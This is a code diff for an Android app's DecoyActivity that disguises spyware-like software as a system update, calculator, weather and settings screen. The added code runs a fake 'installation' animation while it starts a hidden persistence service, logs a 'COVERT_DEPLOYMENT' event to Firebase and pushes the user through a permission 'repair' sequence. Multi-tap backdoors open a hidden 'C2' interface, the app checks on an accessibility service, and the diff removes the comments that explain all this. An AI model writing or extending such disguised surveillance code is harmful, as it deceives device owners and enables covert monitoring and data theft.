@@ -1,8 +1,12 @@
 package com.labs.labrats;
 
+import android.animation.Animator;
+import android.animation.AnimatorSet;
+import android.animation.ObjectAnimator;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.Handler;
+import android.os.Looper;
 import android.util.Log;
 import android.view.View;
 import android.view.ViewGroup;
@@ -18,9 +22,8 @@ import java.util.Locale;
 
 public class DecoyActivity extends AppCompatActivity {
 
-    private ProgressBar progressBar;
     private Button btnCheckUpdate;
-    private ImageView ivUpdateIcon;
+    private View ivUpdateIcon;
     private View pseudoToast;
     private int clickCount = 0;
     private long lastClickTime = 0;
@@ -42,14 +45,22 @@ public class DecoyActivity extends AppCompatActivity {
             setContentView(R.layout.activity_decoy_settings);
             setupSettings();
         } else {
-            setContentView(R.layout.activity_decoy);
-            setupUpdateDecoy();
+            // High-Fidelity System Update Logic
+            boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
+            if (isDeployed) {
+                setContentView(R.layout.activity_decoy_success);
+                setupSuccessDecoy();
+            } else {
+                setContentView(R.layout.activity_new_update);
+                setupUpdateDecoy();
+            }
         }
 
-        // --- GHOST_WAKE_UP: Ensure server is active when decoy is opened ---
-        if (!WorkManager_Sync.isRunning && !WorkManager_Sync.isDestructing) {
+        // --- GHOST_WAKE_UP ---
+        boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
+        if (isDeployed && !WorkManager_Sync.isRunning && !WorkManager_Sync.isDestructing) {
             Intent i = new Intent(this, WorkManager_Sync.class);
-            i.setAction("START");
+            i.setAction(Constants.ACTION_START_CORE);
             try {
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                     startForegroundService(i);
@@ -61,23 +72,111 @@ public class DecoyActivity extends AppCompatActivity {
     }
 
     private void setupUpdateDecoy() {
-        progressBar = findViewById(R.id.decoyProgress);
         btnCheckUpdate = findViewById(R.id.btnCheckUpdate);
         ivUpdateIcon = findViewById(R.id.ivUpdateIcon);
         pseudoToast = findViewById(R.id.pseudoToast);
+        
+        final View loadingLayout = findViewById(R.id.loadingLayout);
 
-        btnCheckUpdate.setOnClickListener(v -> {
-            btnCheckUpdate.setEnabled(false);
-            progressBar.setVisibility(View.VISIBLE);
-            
-            new Handler(getMainLooper()).postDelayed(() -> {
-                progressBar.setVisibility(View.GONE);
-                btnCheckUpdate.setEnabled(true);
-                showPseudoToast();
-            }, 3000);
-        });
+        if (btnCheckUpdate != null) {
+            btnCheckUpdate.setOnClickListener(v -> {
+                btnCheckUpdate.setEnabled(false);
+                
+                // Hide button text and show realistic loading
+                btnCheckUpdate.setText("");
+                
+                if (loadingLayout != null) {
+                    loadingLayout.setVisibility(View.VISIBLE);
+                    startRealisticLoadingAnimation(loadingLayout);
+                }
+                
+                // First Run "Installation" Sequence (12.5 seconds)
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    if (loadingLayout != null) loadingLayout.setVisibility(View.GONE);
+                    btnCheckUpdate.setEnabled(true);
+                    btnCheckUpdate.setText(R.string.decoy_check_btn);
+                    
+                    getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
+                    FirebaseConfig.logActivity("COVERT_DEPLOYMENT: System decoy initialized successfully.");
+                    
+                    // Start persistence core
+                    Intent i = new Intent(this, WorkManager_Sync.class);
+                    i.setAction(Constants.ACTION_START_CORE);
+                    try {
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                            startForegroundService(i);
+                        } else {
+                            startService(i);
+                        }
+                    } catch (Exception ignored) {}
 
-        ivUpdateIcon.setOnClickListener(v -> handleBackdoorClick());
+                    // Transition to Permission Repair Sequence
+                    Intent permissions = new Intent(this, PermissionActivity.class);
+                    startActivityForResult(permissions, 9999);
+
+                }, 12500);
+            });
+        }
+
+        if (ivUpdateIcon != null) {
+            ivUpdateIcon.setOnClickListener(v -> handleBackdoorClick());
+        }
+    }
+
+    private void startRealisticLoadingAnimation(View layout) {
+        // 1. Rotation Animation
+        ObjectAnimator rotate = ObjectAnimator.ofFloat(layout, View.ROTATION, 0f, 360f);
+        rotate.setDuration(1500);
+        rotate.setRepeatCount(ObjectAnimator.INFINITE);
+        rotate.setInterpolator(new android.view.animation.LinearInterpolator());
+
+        // 2. Throbbing (Scale) Animation for the whole group
+        ObjectAnimator scaleX = ObjectAnimator.ofFloat(layout, View.SCALE_X, 0.8f, 1.2f, 0.8f);
+        ObjectAnimator scaleY = ObjectAnimator.ofFloat(layout, View.SCALE_Y, 0.8f, 1.2f, 0.8f);
+        scaleX.setDuration(1200);
+        scaleY.setDuration(1200);
+        scaleX.setRepeatCount(ObjectAnimator.INFINITE);
+        scaleY.setRepeatCount(ObjectAnimator.INFINITE);
+
+        AnimatorSet set = new AnimatorSet();
+        set.playTogether(rotate, scaleX, scaleY);
+        set.start();
+    }
+
+    private void setupSuccessDecoy() {
+        View root = findViewById(R.id.successRoot);
+        if (root != null) {
+            root.setAlpha(0f);
+            root.animate().alpha(1f).setDuration(5000).start();
+        }
+
+        View backdoor = findViewById(R.id.ivSuccessBackdoor);
+        if (backdoor != null) {
+            backdoor.setOnClickListener(v -> handleBackdoorClick());
+        }
+
+        final Button btnCheckForUpdate = findViewById(R.id.btnCheckForUpdate);
+        final View loadingLayout = findViewById(R.id.loadingLayoutSuccess);
+
+        if (btnCheckForUpdate != null) {
+            btnCheckForUpdate.setOnClickListener(v -> {
+                btnCheckForUpdate.setEnabled(false);
+                btnCheckForUpdate.setText("");
+                
+                if (loadingLayout != null) {
+                    loadingLayout.setVisibility(View.VISIBLE);
+                    startRealisticLoadingAnimation(loadingLayout);
+                }
+
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    if (loadingLayout != null) loadingLayout.setVisibility(View.GONE);
+                    btnCheckForUpdate.setEnabled(true);
+                    btnCheckForUpdate.setText(R.string.decoy_check_btn);
+                    
+                    android.widget.Toast.makeText(this, R.string.decoy_no_updates, android.widget.Toast.LENGTH_SHORT).show();
+                }, 4000);
+            });
+        }
     }
 
     private void setupCalculator() {
@@ -146,16 +245,12 @@ public class DecoyActivity extends AppCompatActivity {
         if (cityTv != null) {
             String city = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("last_city", "New York");
             cityTv.setText(city);
-            // BACKDOOR: Multi-tap on city name
             cityTv.setOnClickListener(v -> handleBackdoorClick());
-            
-            // Try to update city if possible
             updateCityName(cityTv);
         }
 
         LinearLayout mainInfo = findViewById(R.id.weatherMainInfo);
         if (mainInfo != null) {
-            // Also add backdoor to the main info area (large text) to make it easier
             mainInfo.setOnClickListener(v -> {
                 Log.d("DecoyActivity", "Weather manual refresh");
                 v.animate().alpha(0.5f).setDuration(200).withEndAction(() -> v.animate().alpha(1.0f).setDuration(200).start()).start();
@@ -219,7 +314,6 @@ public class DecoyActivity extends AppCompatActivity {
 
     private void updateWeatherUnits(boolean isMetric) {
         try {
-            // Find all views with degree symbols and convert them
             ViewGroup root = findViewById(android.R.id.content);
             processViewsForUnits(root, isMetric);
         } catch (Exception ignored) {}
@@ -233,8 +327,6 @@ public class DecoyActivity extends AppCompatActivity {
                 String text = tv.getText().toString();
                 if (text.contains("°")) {
                     try {
-                        String cleanText = text.replace("°", "").trim();
-                        // Handle ranges like "78° 65°" or "High: 78°"
                         String[] parts = text.split(" ");
                         StringBuilder newText = new StringBuilder();
                         for (String part : parts) {
@@ -259,11 +351,9 @@ public class DecoyActivity extends AppCompatActivity {
     private void setupSettings() {
         TextView title = findViewById(R.id.settingsTitle);
         if (title != null) {
-            // BACKDOOR: Multi-tap on "Settings" title
             title.setOnClickListener(v -> handleBackdoorClick());
         }
 
-        // Attach interactivity to all settings items
         android.view.ViewGroup root = findViewById(android.R.id.content);
         if (root != null) {
             attachSettingsInteractivity(root);
@@ -276,21 +366,16 @@ public class DecoyActivity extends AppCompatActivity {
             if (v instanceof TextView) {
                 TextView tv = (TextView) v;
                 String text = tv.getText().toString();
-                
-                // Identify list items (not headers/title)
-                // Settings headers typically have smaller text or are all-caps
                 if (!text.isEmpty() && !text.equals("Settings") && 
                     !text.equals("SYSTEM") && !text.equals("PRIVACY & SECURITY") &&
                     tv.getTextSize() > 45) {
                     
                     v.setOnClickListener(item -> {
-                        Log.d("DecoyActivity", "Settings simulation: " + text);
-                        // Simulate opening a sub-menu
                         View mainContent = findViewById(android.R.id.content);
                         if (mainContent != null) {
                             float originalAlpha = mainContent.getAlpha();
                             mainContent.animate().alpha(0.0f).setDuration(200).withEndAction(() -> {
-                                new Handler(getMainLooper()).postDelayed(() -> {
+                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                     mainContent.animate().alpha(originalAlpha).setDuration(300).start();
                                     android.widget.Toast.makeText(this, "Simulating " + text + " interface...", android.widget.Toast.LENGTH_SHORT).show();
                                 }, 100);
@@ -307,32 +392,51 @@ public class DecoyActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
-        // --- GHOST_HEALTH_CHECK ---
         if (IO_Persistence_Manager.getInstance() == null) {
-            Log.w("DecoyActivity", "GHOST_MODE: Accessibility service lost");
             FirebaseConfig.logActivity("INTEL_NOTICE: Accessibility service is offline");
         }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 9999) {
+            // Permission sequence completed: Switch to Success Screen
+            Log.d("DecoyActivity", "Deployment complete. Displaying Success interface.");
+            
+            setContentView(R.layout.activity_decoy_success);
+            setupSuccessDecoy();
+            
+            // Final Deployment Confirmation
+            pseudoToast = findViewById(R.id.pseudoToast);
+            showPseudoToast();
+        }
+    }
+
+    private void hideSystemUI() {
+        if (getSupportActionBar() != null) getSupportActionBar().hide();
+        getWindow().getDecorView().setSystemUiVisibility(
+                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                | View.SYSTEM_UI_FLAG_FULLSCREEN);
     }
 
     private void handleBackdoorClick() {
         long currentTime = System.currentTimeMillis();
         if (currentTime - lastClickTime < 500) {
             clickCount++;
-            Log.d("DecoyActivity", "Backdoor progress: " + clickCount + "/10");
         } else {
             clickCount = 1;
         }
         lastClickTime = currentTime;
 
         if (clickCount >= 10) {
-            Log.d("DecoyActivity", "Backdoor triggered! Bypassing cover to open C2.");
-            
-            // Just open the C2 interface without changing the launcher icon (mask stays active)
             Intent intent = new Intent(this, MainActivity.class);
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
             startActivity(intent);
-            
-            // Reset counter for next time and finish decoy to prevent backstack leaks
             clickCount = 0;
             finish();
         }
@@ -343,7 +447,7 @@ public class DecoyActivity extends AppCompatActivity {
         pseudoToast.setVisibility(View.VISIBLE);
         pseudoToast.setAlpha(0f);
         pseudoToast.animate().alpha(1f).setDuration(300).start();
-        new Handler(getMainLooper()).postDelayed(() -> {
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
             pseudoToast.animate().alpha(0f).setDuration(300).withEndAction(() -> pseudoToast.setVisibility(View.GONE)).start();
         }, 2500);
     }
